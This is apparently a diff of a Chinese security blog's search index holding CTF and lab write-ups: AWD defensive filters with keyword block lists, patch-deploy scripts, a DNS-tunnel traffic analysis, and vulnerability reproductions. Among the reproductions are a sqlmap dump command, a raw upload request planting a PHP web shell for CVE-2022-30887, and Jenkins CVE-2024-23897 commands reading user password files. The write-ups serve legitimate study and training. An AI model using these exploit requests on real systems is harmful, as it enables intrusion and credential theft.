+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> 去到对应的接口下面修改即可</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> @ ban 了几个协议，如果单纯全部阻挡什么 127.0.0.1，业务不一定过得去。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class sqlFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;file|http|jar|gopher|tar|war&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含SQL关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -357,16 +476,27 @@
 
 <h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package FastjsonFilters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 Fastjson 的自定义防护</span><br><span class="line"> @ 针对 1.2.24 版本，则只添加过滤即可，若针对其他版本</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(false); 将 autoTypeSupprt 设置为 false</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Fastjson1224Filter &#123;</span><br><span class="line">    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception &#123;</span><br><span class="line">        if (str != null &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;</span><br><span class="line">            Pattern p = Pattern.compile(pattern, 2);</span><br><span class="line">            boolean StrMatch = p.matcher(input).matches();</span><br><span class="line">            if (StrMatch) &#123;</span><br><span class="line">                return &quot;Hacker get out!!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">            JSON.parseObject(input);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><h3 id="自定义过滤关键词-2"><a href="#自定义过滤关键词-2" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>自定义过滤关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><h2 id="打包-解包"><a href="#打包-解包" class="headerlink" title="打包&amp;解包"></a>打包&amp;解包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf update.tar.gz update.sh file1 file2</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf 文件名.tar.gz</span><br></pre></td></tr></table></figure>
 
-<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
-<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php $(dirname `find / -name &#x27;explorer.php&#x27; 2&gt;/dev/null`)/explorer.php</span><br></pre></td></tr></table></figure>
+<p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
+<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><p>php不用重启服务，我们先cp把源码保存下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp index.php ../index.php</span><br></pre></td></tr></table></figure>
 
-<p>用find命令从根目录查找名为<code>explorer.php</code>的文件，然后返回他的路径名<code>dirname</code>，<code>2&gt;/dev/null</code>的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p>
+<p>然后把改好的文件移到对应位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php index/explorer.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp app.py /app/app.py</span><br><span class="line">ps -ef | grep python | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">cd /app &amp;&amp; nohup python app.py  &gt;&gt; /opt/app.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp ./app.js /app/app.js</span><br><span class="line">ps -ef | grep app.js | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">nohup node /app/app.js || tail -f /dev/null &amp;</span><br></pre></td></tr></table></figure>
+
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://5ime.cn/awdp.html">https://5ime.cn/awdp.html</a></p>
 <p><a href="https://blog.csdn.net/weixin_51614272/article/details/125527593">https://blog.csdn.net/weixin_51614272/article/details/125527593</a></p>
+<p><a href="https://fushuling.com/index.php/2024/06/15/ciscn%e8%a5%bf%e5%8d%97%e5%a4%8d%e8%b5%9bawdp-web/">https://fushuling.com/index.php/2024/06/15/ciscn%e8%a5%bf%e5%8d%97%e5%a4%8d%e8%b5%9bawdp-web/</a></p>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
@@ -458,7 +588,7 @@
       </tags>
   </entry>
   <entry>
-    <title>CISCN2024初赛</title>
+    <title>CISCN2024 初赛</title>
     <url>/article/CISCN2024%E5%88%9D%E8%B5%9B.html</url>
     <content><![CDATA[<p>国赛爆0，特此记录下CISCN复现学习</p>
 <span id="more"></span>
@@ -549,6 +679,9 @@
       <categories>
         <category>CTF比赛</category>
       </categories>
+      <tags>
+        <tag>CMS</tag>
+      </tags>
   </entry>
   <entry>
     <title>CVE-2022-28512</title>
@@ -574,27 +707,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2022-32991</title>
-    <url>/article/CVE-2022-32991.html</url>
-    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
-<span id="more"></span>
-
-<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
-<p>对各个页面的参数就行sqlmap扫描</p>
-<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CVE-2022-30887</title>
     <url>/article/CVE-2022-30887.html</url>
     <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
@@ -610,6 +722,27 @@
 <p>发包即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CVE-2022-32991</title>
+    <url>/article/CVE-2022-32991.html</url>
+    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
+<span id="more"></span>
+
+<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
+<p>对各个页面的参数就行sqlmap扫描</p>
+<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
 ]]></content>
       <categories>
         <category>春秋云镜</category>
@@ -990,6 +1123,109 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC2024-数据泄露</title>
+    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
+    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
+<span id="more"></span>
+
+<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
+<blockquote>
+<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
+</blockquote>
+<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
+<p>发现这些包非常大，并且对应域名过长</p>
+<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
+<p>我们导出为纯文本文件</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
+<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
+<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
+<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
+<p>直接搜索引擎确定文件名</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
+<p>然后在线网站MD5加密一下，上面那个就是flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
+    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
+    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
+<span id="more"></span>
+
+<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
+<p>cd进入目录下，依次执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>访问8080端口即可</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
+<blockquote>
+<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
+</blockquote>
+<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
+<p>Jenkins有几种鉴权方案：</p>
+<ul>
+<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
+<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
+<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
+<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
+</ul>
+<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
+<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
+<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
+<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
+<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
+<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
+<p>总结一下就是：</p>
+<ul>
+<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
+<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
+</ul>
+<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
+<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
+<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
+<p>比如使用help命令能读取前两行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
+<p>使用keep-build命令，可以读取文件第3行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
+<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
+<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
+<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
+<ul>
+<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
+<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
+<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
+<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
+</ul>
+<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名<code>admin_6382705393240952219</code></p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
+<p>接着读取到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Logjammer-HackTheBox</title>
     <url>/article/Logjammer-HackTheBox.html</url>
     <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
@@ -1066,40 +1302,6 @@
         <tag>HackTheBox</tag>
         <tag>Windows</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>ISCC2024-数据泄露</title>
-    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
-    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
-<span id="more"></span>
-
-<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
-<blockquote>
-<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
-</blockquote>
-<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
-<p>发现这些包非常大，并且对应域名过长</p>
-<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
-<p>我们导出为纯文本文件</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
-<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
-<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
